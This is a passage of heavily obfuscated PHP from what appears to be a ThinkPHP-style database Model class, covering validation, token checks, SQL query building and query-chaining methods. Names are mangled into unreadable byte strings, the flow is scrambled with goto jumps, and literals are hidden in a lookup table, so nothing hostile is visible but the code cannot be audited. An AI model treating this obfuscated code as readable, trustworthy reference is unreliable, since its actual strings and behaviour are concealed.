array_keys($Bù¯ÔíÀÉƒ[0]); $a…ŠÑ›Ïã• = array_shift($EİÑÖâÑÀ); goto c¾ã£º˜ß; c¾ã£º˜ß: $Dï›£Œïğ¤ = array_shift($EİÑÖâÑÀ); $däßçÈÒ¡ˆ = array(); $aá®æ‚‰³ = count($AÊ‰ùµ¥ˆÊ); goto añŠá„…ã†; C”Œ£–§øƒ: } } else { if (!0 !== $EÕ‹Í¨Úì) { $fƒ½àİ±ëƒ[$Fà ªÑæÄ[283]] = is_numeric($EÕ‹Í¨Úì) ? $EÕ‹Í¨Úì : 1; } if ($EÕ‹Í¨Úì === $Fà ªÑæÄ[246]) { unset($fƒ½àİ±ëƒ[$Fà ªÑæÄ[283]]); } $CŸ­àÇñì‹ = $this->db->select($fƒ½àİ±ëƒ); if (!empty($CŸ­àÇñì‹)) { if ($EÕ‹Í¨Úì === $Fà ªÑæÄ[246]) { return reset($CŸ­àÇñì‹[0]); } if (!0 !== $EÕ‹Í¨Úì && 1 == $fƒ½àİ±ëƒ[$Fà ªÑæÄ[283]]) { return reset($CŸ­àÇñì‹[0]); } foreach ($CŸ­àÇñì‹ as $fÏ»´…Ö×í) { $BÇöš„Æëà[] = $fÏ»´…Ö×í[$EİÑÖâÑÀ]; } return $BÇöš„Æëà; } } return null; } public function create($fÈÕÚÕÅ ‘ = '', $EÏ“”‹ëÈ¿ = '') { goto fè…„øŒ; dÜˆº³èª: $fÈÕÚÕÅ ‘ = $this->parseFieldsMap($fÈÕÚÕÅ ‘, 0); $EÏ“”‹ëÈ¿ = $EÏ“”‹ëÈ¿ ? $EÏ“”‹ëÈ¿ : (!empty($fÈÕÚÕÅ ‘[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$D„ŠÅì«³[264]])) { $cŠì²¥¬ = $this->options[$D„ŠÅì«³[264]]; unset($this->options[$D„ŠÅì«³[264]]); } elseif ($EÏ“”‹ëÈ¿ == THINK_MODEL_INSERT && isset($this->insertFields)) { $cŠì²¥¬ = $this->insertFields; } elseif ($EÏ“”‹ëÈ¿ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $cŠì²¥¬ = $this->updateFields; } goto fµ‚Ëùò; fµ‚Ëùò: if (isset($cŠì²¥¬)) { if (is_string($cŠì²¥¬)) { $cŠì²¥¬ = explode($D„ŠÅì«³[47], $cŠì²¥¬); } if (think_config($D„ŠÅì«³[289])) { $cŠì²¥¬[] = think_config($D„ŠÅì«³[290]); } foreach ($fÈÕÚÕÅ ‘ as $a™‹ÓğœÛÁ => $c‘‹†ï»¯) { if (!in_array($a™‹ÓğœÛÁ, $cŠì²¥¬)) { unset($fÈÕÚÕÅ ‘[$a™‹ÓğœÛÁ]); } } } if (!$this->autoValidation($fÈÕÚÕÅ ‘, $EÏ“”‹ëÈ¿)) { return !1; } if (!$this->autoCheckToken($fÈÕÚÕÅ ‘)) { $this->error = think_lang($D„ŠÅì«³[291]); return !1; } goto c§‡ïìˆ±Ñ; c§‡ïìˆ±Ñ: if ($this->autoCheckFields) { $cŠì²¥¬ = $this->getDbFields(); foreach ($fÈÕÚÕÅ ‘ as $a™‹ÓğœÛÁ => $c‘‹†ï»¯) { if (!in_array($a™‹ÓğœÛÁ, $cŠì²¥¬)) { unset($fÈÕÚÕÅ ‘[$a™‹ÓğœÛÁ]); } elseif (MAGIC_QUOTES_GPC && is_string($c‘‹†ï»¯)) { $fÈÕÚÕÅ ‘[$a™‹ÓğœÛÁ] = stripslashes($c‘‹†ï»¯); } } } $this->autoOperation($fÈÕÚÕÅ ‘, $EÏ“”‹ëÈ¿); $this->data = $fÈÕÚÕÅ ‘; goto d®òÒõÙ×‡; fè…„øŒ: $D„ŠÅì«³ =& $_SERVER[İåâé¾]; if (empty($fÈÕÚÕÅ ‘)) { $fÈÕÚÕÅ ‘ = $_POST; } elseif (is_object($fÈÕÚÕÅ ‘)) { $fÈÕÚÕÅ ‘ = get_object_vars($fÈÕÚÕÅ ‘); } if (empty($fÈÕÚÕÅ ‘) || !is_array($fÈÕÚÕÅ ‘)) { $this->error = think_lang($D„ŠÅì«³[262]); return !1; } goto dÜˆº³èª; d®òÒõÙ×‡: return $fÈÕÚÕÅ ‘; goto CÂîÁÏ†˜; CÂîÁÏ†˜: } public function autoCheckToken($fÅ«è³±ï´) { $E˜ÎŒ¥¿åß =& $_SERVER[İåâé¾]; if (isset($this->options[$E˜ÎŒ¥¿åß[292]]) && !$this->options[$E˜ÎŒ¥¿åß[292]]) { return !0; } if (think_config($E˜ÎŒ¥¿åß[289])) { $a›´ï’Ï¸· = think_config($E˜ÎŒ¥¿åß[290]); if (!isset($fÅ«è³±ï´[$a›´ï’Ï¸·]) || Session::get($a›´ï’Ï¸·)) { return !1; } list($FƒŠ®íÀ‘¨, $fğ¤‰Å­‡) = explode($E˜ÎŒ¥¿åß[71], $fÅ«è³±ï´[$a›´ï’Ï¸·]); if ($fğ¤‰Å­‡ && Session::get($a›´ï’Ï¸· . $E˜ÎŒ¥¿åß[90] . $FƒŠ®íÀ‘¨) === $fğ¤‰Å­‡) { Session::remove($a›´ï’Ï¸· . $E˜ÎŒ¥¿åß[90] . $FƒŠ®íÀ‘¨); return !0; } if (think_config($E˜ÎŒ¥¿åß[293])) { Session::remove($a›´ï’Ï¸· . $E˜ÎŒ¥¿åß[90] . $FƒŠ®íÀ‘¨); } return !1; } return !0; } public function regex($E½«†²Âé, $f ¤Ê´Ä‘) { $B¸ì×æè¡õ =& $_SERVER[İåâé¾]; $dò†ã„ñŠñ = array($B¸ì×æè¡õ[294] => $B¸ì×æè¡õ[295], $B¸ì×æè¡õ[296] => $B¸ì×æè¡õ[297], $B¸ì×æè¡õ[298] => $B¸ì×æè¡õ[299], $B¸ì×æè¡õ[300] => $B¸ì×æè¡õ[301], $B¸ì×æè¡õ[302] => $B¸ì×æè¡õ[303], $B¸ì×æè¡õ[304] => $B¸ì×æè¡õ[305], $B¸ì×æè¡õ[306] => $B¸ì×æè¡õ[307], $B¸ì×æè¡õ[281] => $B¸ì×æè¡õ[308], $B¸ì×æè¡õ[309] => $B¸ì×æè¡õ[310]); if (isset($dò†ã„ñŠñ[strtolower($f ¤Ê´Ä‘)])) { $f ¤Ê´Ä‘ = $dò†ã„ñŠñ[strtolower($f ¤Ê´Ä‘)]; } return preg_match($f ¤Ê´Ä‘, $E½«†²Âé) === 1; } private function autoOperation(&$FÆˆßç³‚¤, $B¶½¦×ìØ’) { $aÈéïÉŞ =& $_SERVER[İåâé¾]; if (!empty($this->options[$aÈéïÉŞ[311]])) { $eùä÷©¡ï© = $this->options[$aÈéïÉŞ[311]]; unset($this->options[$aÈéïÉŞ[311]]); } elseif (!empty($this->_auto)) { $eùä÷©¡ï© = $this->_auto; } if (isset($eùä÷©¡ï©)) { foreach ($eùä÷©¡ï© as $D“Çºšßî¦) { if (empty($D“Çºšßî¦[2])) { $D“Çºšßî¦[2] = THINK_MODEL_INSERT; } if ($B¶½¦×ìØ’ == $D“Çºšßî¦[2] || $D“Çºšßî¦[2] == THINK_MODEL_BOTH) { switch (trim($D“Çºšßî¦[3])) { case $aÈéïÉŞ[312]: case $aÈéïÉŞ[313]: $Eª½ï…æ = isset($D“Çºšßî¦[4]) ? (array) $D“Çºšßî¦[4] : array(); if (isset($FÆˆßç³‚¤[$D“Çºšßî¦[0]])) { array_unshift($Eª½ï…æ, $FÆˆßç³‚¤[$D“Çºšßî¦[0]]); } if ($aÈéïÉŞ[312] == $D“Çºšßî¦[3]) { $FÆˆßç³‚¤[$D“Çºšßî¦[0]] = call_user_func_array($D“Çºšßî¦[1], $Eª½ï…æ); } else { $FÆˆßç³‚¤[$D“Çºšßî¦[0]] = call_user_func_array(array(&$this, $D“Çºšßî¦[1]), $Eª½ï…æ); } break; case $aÈéïÉŞ[264]: $FÆˆßç³‚¤[$D“Çºšßî¦[0]] = $FÆˆßç³‚¤[$D“Çºšßî¦[1]]; break; case $aÈéïÉŞ[314]: if ($aÈéïÉŞ[33] === $FÆˆßç³‚¤[$D“Çºšßî¦[0]]) { unset($FÆˆßç³‚¤[$D“Çºšßî¦[0]]); } break; case $aÈéïÉŞ[315]: default: $FÆˆßç³‚¤[$D“Çºšßî¦[0]] = $D“Çºšßî¦[1]; } if (!1 === $FÆˆßç³‚¤[$D“Çºšßî¦[0]]) { unset($FÆˆßç³‚¤[$D“Çºšßî¦[0]]); } } } } return $FÆˆßç³‚¤; } protected function autoValidation($b·Â½¼”ª¿, $BÛõÊ˜º‡¦) { $F†ßÙ®²À¨ =& $_SERVER[İåâé¾]; if (!empty($this->options[$F†ßÙ®²À¨[316]])) { $e™¯…Ÿ²´¤ = $this->options[$F†ßÙ®²À¨[316]]; unset($this->options[$F†ßÙ®²À¨[316]]); } elseif (!empty($this->_validate)) { $e™¯…Ÿ²´¤ = $this->_validate; } if (isset($e™¯…Ÿ²´¤)) { if ($this->patchValidate) { $this->error = array(); } foreach ($e™¯…Ÿ²´¤ as $CÊ½·ñ¬ô› => $BÆØõÄ½†î) { if (empty($BÆØõÄ½†î[5]) || $BÆØõÄ½†î[5] == THINK_MODEL_BOTH || $BÆØõÄ½†î[5] == $BÛõÊ˜º‡¦) { if (0 == strpos($BÆØõÄ½†î[2], $F†ßÙ®²À¨[317]) && strpos($BÆØõÄ½†î[2], $F†ßÙ®²À¨[318])) { $BÆØõÄ½†î[2] = think_lang(substr($BÆØõÄ½†î[2], 2, -1)); } $BÆØõÄ½†î[3] = isset($BÆØõÄ½†î[3]) ? $BÆØõÄ½†î[3] : THINK_EXISTS_VALIDATE; $BÆØõÄ½†î[4] = isset($BÆØõÄ½†î[4]) ? $BÆØõÄ½†î[4] : $F†ßÙ®²À¨[319]; switch ($BÆØõÄ½†î[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($b·Â½¼”ª¿, $BÆØõÄ½†î)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($F†ßÙ®²À¨[33] != trim($b·Â½¼”ª¿[$BÆØõÄ½†î[0]])) { if (!1 === $this->_validationField($b·Â½¼”ª¿, $BÆØõÄ½†î)) { return !1; } } break; default: if (isset($b·Â½¼”ª¿[$BÆØõÄ½†î[0]])) { if (!1 === $this->_validationField($b·Â½¼”ª¿, $BÆØõÄ½†î)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($cÑùÂ‘‚ø, $eÔâ§¿Ÿ±Í) { if (!1 === $this->_validationFieldItem($cÑùÂ‘‚ø, $eÔâ§¿Ÿ±Í)) { if ($this->patchValidate) { $this->error[$eÔâ§¿Ÿ±Í[0]] = $eÔâ§¿Ÿ±Í[2]; } else { $this->error = $eÔâ§¿Ÿ±Í[2]; return !1; } } return; } protected function _validationFieldItem($Få´Ì¬…ø, $Bİµ¶’èë) { $F§ëòØÀ¢× =& $_SERVER[İåâé¾]; switch (strtolower(trim($Bİµ¶’èë[4]))) { case $F§ëòØÀ¢×[312]: case $F§ëòØÀ¢×[313]: $Dƒ£Œ¶ª = isset($Bİµ¶’èë[6]) ? (array) $Bİµ¶’èë[6] : array(); if (is_string($Bİµ¶’èë[0]) && strpos($Bİµ¶’èë[0], $F§ëòØÀ¢×[47])) { $Bİµ¶’èë[0] = explode($F§ëòØÀ¢×[47], $Bİµ¶’èë[0]); } if (is_array($Bİµ¶’èë[0])) { foreach ($Bİµ¶’èë[0] as $c…©¤ãˆ»‘) { $EÂŞßÛ§Ä[$c…©¤ãˆ»‘] = $Få´Ì¬…ø[$c…©¤ãˆ»‘]; } array_unshift($Dƒ£Œ¶ª, $EÂŞßÛ§Ä); } else { array_unshift($Dƒ£Œ¶ª, $Få´Ì¬…ø[$Bİµ¶’èë[0]]); } if ($F§ëòØÀ¢×[312] == $Bİµ¶’èë[4]) { return call_user_func_array($Bİµ¶’èë[1], $Dƒ£Œ¶ª); } else { return call_user_func_array(array(&$this, $Bİµ¶’èë[1]), $Dƒ£Œ¶ª); } case $F§ëòØÀ¢×[320]: return $Få´Ì¬…ø[$Bİµ¶’èë[0]] == $Få´Ì¬…ø[$Bİµ¶’èë[1]]; case $F§ëòØÀ¢×[321]: if (is_string($Bİµ¶’èë[0]) && strpos($Bİµ¶’èë[0], $F§ëòØÀ¢×[47])) { $Bİµ¶’èë[0] = explode($F§ëòØÀ¢×[47], $Bİµ¶’èë[0]); } $CÈ—÷ì±ÜŸ = array(); if (is_array($Bİµ¶’èë[0])) { foreach ($Bİµ¶’èë[0] as $c…©¤ãˆ»‘) { $CÈ—÷ì±ÜŸ[$c…©¤ãˆ»‘] = $Få´Ì¬…ø[$c…©¤ãˆ»‘]; } } else { $CÈ—÷ì±ÜŸ[$Bİµ¶’èë[0]] = $Få´Ì¬…ø[$Bİµ¶’èë[0]]; } if (!empty($Få´Ì¬…ø[$this->getPk()])) { $CÈ—÷ì±ÜŸ[$this->getPk()] = array($F§ëòØÀ¢×[322], $Få´Ì¬…ø[$this->getPk()]); } if ($this->where($CÈ—÷ì±ÜŸ)->find()) { return !1; } return !0; default: return $this->check($Få´Ì¬…ø[$Bİµ¶’èë[0]], $Bİµ¶’èë[1], $Bİµ¶’èë[4]); } } public function check($A•Ğ›íÔ‡­, $bøæ×Š—Öä, $DŒ×‡ëâË = "\x72\x65\x67\145\x78") { $E‰¤ŒîÀªÊ =& $_SERVER[İåâé¾]; $DŒ×‡ëâË = strtolower(trim($DŒ×‡ëâË)); switch ($DŒ×‡ëâË) { case $E‰¤ŒîÀªÊ[7]: case $E‰¤ŒîÀªÊ[323]: $b»’ÓƒÉ™­ = is_array($bøæ×Š—Öä) ? $bøæ×Š—Öä : explode($E‰¤ŒîÀªÊ[47], $bøæ×Š—Öä); return $DŒ×‡ëâË == $E‰¤ŒîÀªÊ[7] ? in_array($A•Ğ›íÔ‡­, $b»’ÓƒÉ™­) : !in_array($A•Ğ›íÔ‡­, $b»’ÓƒÉ™­); case $E‰¤ŒîÀªÊ[324]: case $E‰¤ŒîÀªÊ[325]: if (is_array($bøæ×Š—Öä)) { $Bİó³™ô‰å = $bøæ×Š—Öä[0]; $eçä‘ÙÅ‰‘ = $bøæ×Š—Öä[1]; } else { list($Bİó³™ô‰å, $eçä‘ÙÅ‰‘) = explode($E‰¤ŒîÀªÊ[47], $bøæ×Š—Öä); } return $DŒ×‡ëâË == $E‰¤ŒîÀªÊ[324] ? $A•Ğ›íÔ‡­ >= $Bİó³™ô‰å && $A•Ğ›íÔ‡­ <= $eçä‘ÙÅ‰‘ : $A•Ğ›íÔ‡­ < $Bİó³™ô‰å || $A•Ğ›íÔ‡­ > $eçä‘ÙÅ‰‘; case $E‰¤ŒîÀªÊ[326]: case $E‰¤ŒîÀªÊ[327]: return $DŒ×‡ëâË == $E‰¤ŒîÀªÊ[326] ? $A•Ğ›íÔ‡­ == $bøæ×Š—Öä : $A•Ğ›íÔ‡­ != $bøæ×Š—Öä; case $E‰¤ŒîÀªÊ[328]: $C‚’·Âƒ†• = mb_strlen($A•Ğ›íÔ‡­, $E‰¤ŒîÀªÊ[329]); if (strpos($bøæ×Š—Öä, $E‰¤ŒîÀªÊ[47])) { list($Bİó³™ô‰å, $eçä‘ÙÅ‰‘) = explode($E‰¤ŒîÀªÊ[47], $bøæ×Š—Öä); return $C‚’·Âƒ†• >= $Bİó³™ô‰å && $C‚’·Âƒ†• <= $eçä‘ÙÅ‰‘; } else { return $C‚’·Âƒ†• == $bøæ×Š—Öä; } case $E‰¤ŒîÀªÊ[330]: list($F‘ŸÀ™ÛÍå, $fó´‡³ØôÅ) = explode($E‰¤ŒîÀªÊ[47], $bøæ×Š—Öä); if (!is_numeric($F‘ŸÀ™ÛÍå)) { $F‘ŸÀ™ÛÍå = strtotime($F‘ŸÀ™ÛÍå); } if (!is_numeric($fó´‡³ØôÅ)) { $fó´‡³ØôÅ = strtotime($fó´‡³ØôÅ); } return NOW_TIME >= $F‘ŸÀ™ÛÍå && NOW_TIME <= $fó´‡³ØôÅ; case $E‰¤ŒîÀªÊ[331]: return in_array(get_client_ip(), explode($E‰¤ŒîÀªÊ[47], $bøæ×Š—Öä)); case $E‰¤ŒîÀªÊ[332]: return !in_array(get_client_ip(), explode($E‰¤ŒîÀªÊ[47], $bøæ×Š—Öä)); case $E‰¤ŒîÀªÊ[319]: default: return $this->regex($A•Ğ›íÔ‡­, $bøæ×Š—Öä); } } public function query($Aî¯ê¦Œˆ, $e”õ‘’·ô = false) { $EŒá¬Áºš =& $_SERVER[İåâé¾]; if (!is_bool($e”õ‘’·ô) && !is_array($e”õ‘’·ô)) { $e”õ‘’·ô = func_get_args(); array_shift($e”õ‘’·ô); } $Aî¯ê¦Œˆ = str_replace(array($EŒá¬Áºš[223], $EŒá¬Áºš[333]), $EŒá¬Áºš[50], $Aî¯ê¦Œˆ); $Aî¯ê¦Œˆ = $this->parseSql($Aî¯ê¦Œˆ, $e”õ‘’·ô); return $this->db->query($Aî¯ê¦Œˆ); } public function execute($fâè¡õäº¢, $e«–ƒ†ÙÚ¨ = false) { if (!is_bool($e«–ƒ†ÙÚ¨) && !is_array($e«–ƒ†ÙÚ¨)) { $e«–ƒ†ÙÚ¨ = func_get_args(); array_shift($e«–ƒ†ÙÚ¨); } $fâè¡õäº¢ = $this->parseSql($fâè¡õäº¢, $e«–ƒ†ÙÚ¨); return $this->db->execute($fâè¡õäº¢); } protected function parseSql($BÙó¾ïÏã, $fã©‚¿ñ‚¨) { $aêÛŒÜ£¡ =& $_SERVER[İåâé¾]; if (!0 === $fã©‚¿ñ‚¨) { $dïõÂÀ¢¸º = $this->_parseOptions(); $BÙó¾ïÏã = $this->db->parseSql($BÙó¾ïÏã, $dïõÂÀ¢¸º); } elseif (is_array($fã©‚¿ñ‚¨)) { $fã©‚¿ñ‚¨ = array_map(array($this->db, $aêÛŒÜ£¡[334]), $fã©‚¿ñ‚¨); $BÙó¾ïÏã = vsprintf($BÙó¾ïÏã, $fã©‚¿ñ‚¨); } else { $BÙó¾ïÏã = strtr($BÙó¾ïÏã, array($aêÛŒÜ£¡[335] => $this->getTableName(), $aêÛŒÜ£¡[336] => think_config($aêÛŒÜ£¡[235]))); } $this->db->setModel($this->name); return $BÙó¾ïÏã; } public function db($bß¬İ¨‰´ = '', $fÉöŞèÇè‹ = '', $e¹–É„‰ç = array()) { goto E•÷‘Û®ÆÑ; E•÷‘Û®ÆÑ: $eË ÖƒÙæ =& $_SERVER[İåâé¾]; if ($eË ÖƒÙæ[33] === $bß¬İ¨‰´ && $this->db) { return $this->db; } static $dî¼½ùÎ›Ì = array(); goto Bˆ¾İ•Û©; DÍÇ«õ³ë¸: $dî¼½ùÎ›Ì[$bß¬İ¨‰´] = $fÉöŞèÇè‹; $this->db = $b´ÓÇÁ©ÙŠ[$bß¬İ¨‰´]; $this->_after_db(); goto bÚæ¦Äğ; bÚæ¦Äğ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto BÁ‹¬†œä“; Bˆ¾İ•Û©: static $b´ÓÇÁ©ÙŠ = array(); if (!isset($b´ÓÇÁ©ÙŠ[$bß¬İ¨‰´]) || isset($b´ÓÇÁ©ÙŠ[$bß¬İ¨‰´]) && $fÉöŞèÇè‹ && $dî¼½ùÎ›Ì[$bß¬İ¨‰´] != $fÉöŞèÇè‹) { if (!empty($fÉöŞèÇè‹) && is_string($fÉöŞèÇè‹) && !1 === strpos($fÉöŞèÇè‹, $eË ÖƒÙæ[8])) { $fÉöŞèÇè‹ = think_config($fÉöŞèÇè‹); } $b´ÓÇÁ©ÙŠ[$bß¬İ¨‰´] = Db::getInstance($fÉöŞèÇè‹); } elseif (NULL === $fÉöŞèÇè‹) { $b´ÓÇÁ©ÙŠ[$bß¬İ¨‰´]->close(); unset($b´ÓÇÁ©ÙŠ[$bß¬İ¨‰´]); return; } if (!empty($e¹–É„‰ç)) { if (is_string($e¹–É„‰ç)) { parse_str($e¹–É„‰ç, $e¹–É„‰ç); } foreach ($e¹–É„‰ç as $EšÅÀ‚¥ˆª => $Fâùì¼£–) { $this->setProperty($EšÅÀ‚¥ˆª, $Fâùì¼£–); } } goto DÍÇ«õ³ë¸; BÁ‹¬†œä“: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Dê÷Øç—º¨ = get_class($this); if ($Dê÷Øç—º¨ == $_SERVER[İåâé¾][337]) { return $this->name; } $this->name = substr($Dê÷Øç—º¨, 0, -5); } return $this->name; } public function getTableName() { $Eç§éÈ°ÄĞ =& $_SERVER[İåâé¾]; if (empty($this->trueTableName)) { $bïí»‘¬ƒ  = !empty($this->tablePrefix) ? $this->tablePrefix : $Eç§éÈ°ÄĞ[33]; if (!empty($this->tableName)) { $bïí»‘¬ƒ  .= $this->tableName; } else { $bïí»‘¬ƒ  .= think_parse_name($this->name); } $this->trueTableName = strtolower($bïí»‘¬ƒ ); } return (!empty($this->dbName) ? $this->dbName . $Eç§éÈ°ÄĞ[90] : $Eç§éÈ°ÄĞ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $BµàäØÙéæ =& $_SERVER[İåâé¾]; return isset($this->fields[$BµàäØÙéæ[242]]) ? $this->fields[$BµàäØÙéæ[242]] : $this->pk; } public function getDbFields() { $Cíà²‘›Õ =& $_SERVER[İåâé¾]; if (isset($this->options[$Cíà²‘›Õ[270]])) { $c‹’Ç’ëÏÉ = $this->db->getFields($this->options[$Cíà²‘›Õ[270]]); return $c‹’Ç’ëÏÉ ? array_keys($c‹’Ç’ëÏÉ) : !1; } if ($this->fields) { $c‹’Ç’ëÏÉ = $this->fields; unset($c‹’Ç’ëÏÉ[$Cíà²‘›Õ[241]], $c‹’Ç’ëÏÉ[$Cíà²‘›Õ[242]], $c‹’Ç’ëÏÉ[$Cíà²‘›Õ[243]], $c‹’Ç’ëÏÉ[$Cíà²‘›Õ[240]]); return $c‹’Ç’ëÏÉ; } return !1; } public function data($A†ÂÂ•ø©Ó = '') { $B¯º¼â§µÜ =& $_SERVER[İåâé¾]; if ($B¯º¼â§µÜ[33] === $A†ÂÂ•ø©Ó && !empty($this->data)) { return $this->data; } if (is_object($A†ÂÂ•ø©Ó)) { $A†ÂÂ•ø©Ó = get_object_vars($A†ÂÂ•ø©Ó); } elseif (is_string($A†ÂÂ•ø©Ó)) { parse_str($A†ÂÂ•ø©Ó, $A†ÂÂ•ø©Ó); } elseif (!is_array($A†ÂÂ•ø©Ó)) { think_exception(think_lang($B¯º¼â§µÜ[262])); } $this->data = $A†ÂÂ•ø©Ó; return $this; } public function join($E”óÌîÂ‰) { $d‡º·âÜÊŠ =& $_SERVER[İåâé¾]; if (is_array($E”óÌîÂ‰)) { $this->options[$d‡º·âÜÊŠ[273]] = $E”óÌîÂ‰; } elseif (!empty($E”óÌîÂ‰)) { $this->options[$d‡º·âÜÊŠ[273]][] = $E”óÌîÂ‰; } return $this; } public function union($BÄÇ’é£¬õ, $Eóƒ±Òæ¥à = false) { goto AõÊ­¾À; E®äƒÁ¦æ‡: if (is_object($BÄÇ’é£¬õ)) { $BÄÇ’é£¬õ = get_object_vars($BÄÇ’é£¬õ); } if (is_string($BÄÇ’é£¬õ)) { $E†ÀôòçÇ¼ = $BÄÇ’é£¬õ; } elseif (is_array($BÄÇ’é£¬õ)) { if (isset($BÄÇ’é£¬õ[0])) { $this->options[$FÄøäšÉ¨˜[338]] = array_merge($this->options[$FÄøäšÉ¨˜[338]], $BÄÇ’é£¬õ); return $this; } else { $E†ÀôòçÇ¼ = $BÄÇ’é£¬õ; } } else { think_exception(think_lang($FÄøäšÉ¨˜[262])); } $this->options[$FÄøäšÉ¨˜[338]][] = $E†ÀôòçÇ¼; goto CßÃÔŞµ; AõÊ­¾À: $FÄøäšÉ¨˜ =& $_SERVER[İåâé¾]; if (empty($BÄÇ’é£¬õ)) { return $this; } if ($Eóƒ±Òæ¥à) { $this->options[$FÄøäšÉ¨˜[338]][$FÄøäšÉ¨˜[339]] = !0; } goto E®äƒÁ¦æ‡; CßÃÔŞµ: return $this; goto DÃ»§…£“; DÃ»§…£“: } public function cache($c®Íé±êÄä = true, $CèŞ±À•Ä = null, $BÀ•„Ò½áÆ = '') { $AÚ•òÕá‘ë =& $_SERVER[İåâé¾]; if (!1 !== $c®Íé±êÄä) { $this->options[$AÚ•òÕá‘ë[340]] = array($AÚ•òÕá‘ë[88] => $c®Íé±êÄä, $AÚ•òÕá‘ë[330] => $CèŞ±À•Ä, $AÚ•òÕá‘ë[29] => $BÀ•„Ò½áÆ); } return $this; } public function field($E¢¢ç”ö½Š, $AéñªŸ†—Ù = false) { $føïå‘‚Ê‚ =& $_SERVER[İåâé¾]; if (!0 === $E¢¢ç”ö½Š) { $a¥ó‡Ğ°÷Ï = $this->getDbFields(); $E¢¢ç”ö½Š = $a¥ó‡Ğ°÷Ï ? $a¥ó‡Ğ°÷Ï : $føïå‘‚Ê‚[172]; } elseif ($AéñªŸ†—Ù) { if (is_string($E¢¢ç”ö½Š)) { $E¢¢ç”ö½Š = explode($føïå‘‚Ê‚[47], $E¢¢ç”ö½Š); } $a¥ó‡Ğ°÷Ï = $this->getDbFields(); $E¢¢ç”ö½Š = $a¥ó‡Ğ°÷Ï ? array_diff($a¥ó‡Ğ°÷Ï, $E¢¢ç”ö½Š) : $E¢¢ç”ö½Š; } $this->options[$føïå‘‚Ê‚[264]] = $E¢¢ç”ö½Š; return $this; } public function scope($bğ­»Æù = '', $E¨„ÃÕâƒ‹ = NULL) { $DÃÍÜ‹ÀÅ¯ =& $_SERVER[İåâé¾]; if ($DÃÍÜ‹ÀÅ¯[33] === $bğ­»Æù) { if (isset($this->_scope[$DÃÍÜ‹ÀÅ¯[34]])) { $B¼ä­¨Á°ˆ = $this->_scope[$DÃÍÜ‹ÀÅ¯[34]]; } else { return $this; } } elseif (is_string($bğ­»Æù)) { $bùÄÕ³Æ” = explode($DÃÍÜ‹ÀÅ¯[47], $bğ­»Æù); $B¼ä­¨Á°ˆ = array(); foreach ($bùÄÕ³Æ” as $eö‘ØµÆ½„) { if (!isset($this->_scope[$eö‘ØµÆ½„])) { continue; } $B¼ä­¨Á°ˆ = array_merge($B¼ä­¨Á°ˆ, $this->_scope[$eö‘ØµÆ½„]); } if (!empty($E¨„ÃÕâƒ‹) && is_array($E¨„ÃÕâƒ‹)) { $B¼ä­¨Á°ˆ = array_merge($B¼ä­¨Á°ˆ, $E¨„ÃÕâƒ‹); } } elseif (is_array($bğ­»Æù)) { $B¼ä­¨Á°ˆ = $bğ­»Æù; } if (is_array($B¼ä­¨Á°ˆ) && !empty($B¼ä­¨Á°ˆ)) { $this->options = array_merge($this->options, array_change_key_case($B¼ä­¨Á°ˆ)); } return $this; } public function where($A‘×öÀ‘áÒ, $E™Ê‘­îåõ = null) { $EĞÁ†ÇŸ»Ú =& $_SERVER[İåâé¾]; if (!is_null($E™Ê‘­îåõ) && is_string($A‘×öÀ‘áÒ)) { if (!is_array($E™Ê‘­îåõ)) { $E™Ê‘­îåõ = func_get_args(); array_shift($E™Ê‘­îåõ); } $E™Ê‘­îåõ = array_map(array($this->db, $EĞÁ†ÇŸ»Ú[334]), $E™Ê‘­îåõ); $A‘×öÀ‘áÒ = vsprintf($A‘×öÀ‘áÒ, $E™Ê‘­îåõ); } elseif (is_object($A‘×öÀ‘áÒ)) { $A‘×öÀ‘áÒ = get_object_vars($A‘×öÀ‘áÒ); } if (is_string($A‘×öÀ‘áÒ) && $EĞÁ†ÇŸ»Ú[33] != $A‘×öÀ‘áÒ) { $B¼Ü—–ÁÈ = array(); $B¼Ü—–ÁÈ[$EĞÁ†ÇŸ»Ú[341]] = $A‘×öÀ‘áÒ; $A‘×öÀ‘áÒ = $B¼Ü—–ÁÈ; } if (isset($this->options[$EĞÁ†ÇŸ»Ú[266]])) { $this->options[$EĞÁ†ÇŸ»Ú[266]] = array_merge($this->options[$EĞÁ†ÇŸ»Ú[266]], $A‘×öÀ‘áÒ); } else { $this->options[$EĞÁ†ÇŸ»Ú[266]] = $A‘×öÀ‘áÒ; } return $this; } public function limit($f—ƒ•¡§®À, $cË§îÏíÜ = null) { $b‰òÔ ¹å¥ =& $_SERVER[İåâé¾]; $this->options[$b‰òÔ ¹å¥[283]] = is_null($cË§îÏíÜ) ? $f—ƒ•¡§®À : $f—ƒ•¡§®À . $b‰òÔ ¹å¥[47] . $cË§îÏíÜ; return $this; } public function page($cèİï•­ë, $Aš¦®Îò‘ = null) { $dğÇßß¹² =& $_SERVER[İåâé¾]; $this->options[$dğÇßß¹²[342]] = is_null($Aš¦®Îò‘) ? $cèİï•­ë : $cèİï•­ë . $dğÇßß¹²[47] . $Aš¦®Îò‘; return $this; } public function comment($B¹é¾¢Ùˆà) { $this->options[$_SERVER[İåâé¾][343]] = $B¹é¾¢Ùˆà; return $this; } public function setProperty($F‚êÎÎ¨¤†, $FİŠ“Ö”¡) { if (property_exists($this, $F‚êÎÎ¨¤†)) { $this->{$F‚êÎÎ¨¤†} = $FİŠ“Ö”¡; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\x73\x65\x72\x74\54\165\x70\x64\141\164\145", "\146\x75\156\143\x74\151\x6f\x6e"), array("\143\x72\145\141\164\x65\124\151\155\x65", "\x74\151\x6d\145", "\151\156\x73\x65\x72\164", 